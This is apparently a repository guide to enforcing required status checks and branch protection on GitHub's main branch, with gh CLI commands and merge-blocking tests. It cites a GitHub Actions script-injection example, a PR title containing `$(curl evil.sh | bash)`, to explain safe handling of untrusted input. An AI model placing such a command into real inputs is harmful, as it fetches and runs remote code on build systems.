# Enforcing PR checks on `main`

This doc captures everything needed to reproduce (or extend) the required-status-check
setup used in this repo, plus the concrete tests that prove it actually blocks merges
rather than just showing pass/fail badges.

## 1. Prerequisites

- `gh` CLI authenticated with `admin:org` + `repo` scopes on the target org/repo.
- **Branch protection on a *private* repo requires GitHub Pro (user) or Team/Enterprise
  (org).** On the GitHub Free plan, applying protection to a private repo's branch
  returns `403: Upgrade to GitHub Pro or make this repository public`. This repo is
  public specifically to work around that limit — if you're on a paid plan, you can skip
  this and keep the repo private.

## 2. The two required checks

| Check name (job `name:`) | Workflow file | Trigger | What it validates |
|---|---|---|---|
| `build` | `.github/workflows/build-and-deploy.yml` | `pull_request` + `push` to `main` | Restores, builds, and runs tests. Pack/publish steps only run on `push` to `main`. |
| `PR Title Check` | `.github/workflows/pr-title-check.yml` | `pull_request` (opened/edited/synchronize/reopened) | Fails unless the PR title or body contains a ticket tag matching `\[[A-Z]{2,10}-[0-9]+\]` (e.g. `[GHPR-123]`). |

**Why the same job name is used for both `push` and `pull_request` in `build-and-deploy.yml`:**
GitHub's required-status-check `context`/`checks` list matches on the job's `name:`
string. Using one job for both events guarantees the context reported on a PR run is
identical to the one branch protection expects — no drift between "what runs on the PR"
and "what's configured as required."

**Why the PR title/body are read via `env:`, not interpolated into `run:`:** directly
writing `${{ github.event.pull_request.title }}` into a shell script is a known GitHub
Actions script-injection vector (a malicious title like `` $(curl evil.sh | bash) `` gets
re-parsed as shell). Passing it through `env:` and referencing `$PR_TITLE` keeps it as
inert string data.

## 3. Discover exact check-run names before locking protection

Required-status-check `context` strings must match exactly what GitHub reports on a real
run. Don't guess — open a throwaway PR first and read the names back:

```bash
gh pr create --title "[GHPR-1] Test PR to discover check names" --body "..." --base main --head <branch>
gh pr checks <PR-number> --repo hkpoc/gh-pr-rules
```

## 4. Apply branch protection on `main`

```bash
cat <<'EOF' | gh api --method PUT \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  repos/hkpoc/gh-pr-rules/branches/main/protection \
  --input -
{
  "required_status_checks": {
    "strict": true,
    "checks": [
      { "context": "build" },
      { "context": "PR Title Check" }
    ]
  },
  "enforce_admins": true,
  "required_pull_request_reviews": {
    "required_approving_review_count": 0,
    "dismiss_stale_reviews": false,
    "require_code_owner_reviews": false
  },
  "restrictions": null,
  "required_linear_history": false,
  "allow_force_pushes": false,
  "allow_deletions": false
}
EOF
```

What each field is doing:

- `required_status_checks.strict: true` — PR branch must be up to date with `main`
  before merge (forces a re-run against the latest `main`, catches stale-branch merges).
- `required_status_checks.checks` — the two context names from step 3. This is what
  makes `build` and `PR Title Check` mandatory.
- `enforce_admins: true` — blocks *everyone*, including org/repo admins, from bypassing
  the checks via the merge button or `gh pr merge --admin`. Without this, an admin can
  always force-merge a red PR, which defeats the point of a strength test.
- `required_pull_request_reviews.required_approving_review_count: 0` — this (not
  `required_status_checks`) is what actually blocks **direct pushes** to `main`, by
  forcing all changes through a PR. `0` means no human approval is mandatory, so it
  works for a solo repo while still closing the direct-push loophole.
- `restrictions: null` — no push allowlist needed here.

Verify: `gh api repos/hkpoc/gh-pr-rules/branches/main/protection`

## 5. Verification tests run in this session (all confirmed working)

| # | Scenario | Command | Result |
|---|---|---|---|
| 1 | Direct push to `main` | `git push origin main` | **Rejected**: `GH006: Protected branch update failed... Changes must be made through a pull request... 2 of 2 required status checks are expected.` |
| 2 | PR missing the ticket tag | `gh pr merge <n> --squash` | `PR Title Check` fails → PR `mergeStateStatus: BLOCKED` → merge refused: `the base branch policy prohibits the merge.` |
| 3 | PR with a deliberately broken test | same as above | `build` fails → same `BLOCKED` / refused-merge result |
| 4 | Admin-forced merge on a failing PR | `gh pr merge <n> --squash --admin` | **Rejected** even with `--admin`: `2 of 2 required status checks are failing.` — proves `enforce_admins: true` actually holds |
| 5 | Tagged PR + passing build/tests | `gh pr merge <n> --squash` | Succeeds; the resulting push-to-`main` run packs and publishes a new NuGet version to GitHub Packages |

To repeat scenario 2/3, open a PR with an untagged title or a broken test respectively,
then attempt `gh pr merge`. To repeat scenario 1, try `git push origin main` directly on
any branch tip. To repeat scenario 4, use `--admin` on a PR you know is failing.

## 6. Rollback / relaxing rules later

```bash
# Turn off admin enforcement (admins can then bypass via merge button):
gh api --method DELETE repos/hkpoc/gh-pr-rules/branches/main/protection/enforce_admins

# Remove branch protection entirely:
gh api --method DELETE repos/hkpoc/gh-pr-rules/branches/main/protection
```
